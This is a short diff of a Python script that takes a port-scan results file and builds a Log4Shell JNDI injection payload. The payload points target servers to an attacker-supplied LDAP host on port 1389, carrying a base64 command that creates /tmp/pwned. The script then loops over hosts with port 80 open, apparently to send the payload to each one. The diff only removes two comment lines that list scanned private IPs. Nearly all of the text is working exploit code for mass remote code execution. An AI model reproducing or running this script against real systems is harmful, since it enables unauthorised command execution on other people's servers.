@@ -7,8 +7,7 @@ import sys
 file = open(sys.argv[1], 'r')
 datas = file.read().splitlines()
 payload= '${jndi:ldap://'+sys.argv[2]+'}:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
-#Discovered open port 80/tcp on 192.168.1.82
-#Discovered open port 443/tcp on 192.168.11.98
+
 for data in datas:
     data=data.split()
     if data[3]=="80/tcp":
